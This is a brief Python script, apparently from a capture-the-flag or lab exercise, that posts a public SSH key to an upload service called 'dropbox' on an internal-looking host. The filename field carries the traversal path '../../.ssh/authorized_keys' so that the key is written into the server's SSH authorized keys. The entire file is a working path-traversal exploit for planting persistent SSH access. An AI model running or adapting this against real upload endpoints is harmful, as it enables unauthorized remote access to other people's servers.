import requests

if __name__ == "__main__":
    # Send id_rsa.pub to dropbox with the name as a path. This will place the file in another location.
    with open("id_rsa.pub", "rb") as f:
        r = requests.post("https://dropbox.internal.regjeringen.uiaikt.no/", files={"file": ("../../.ssh/authorized_keys", f)})
        print(r.status_code)
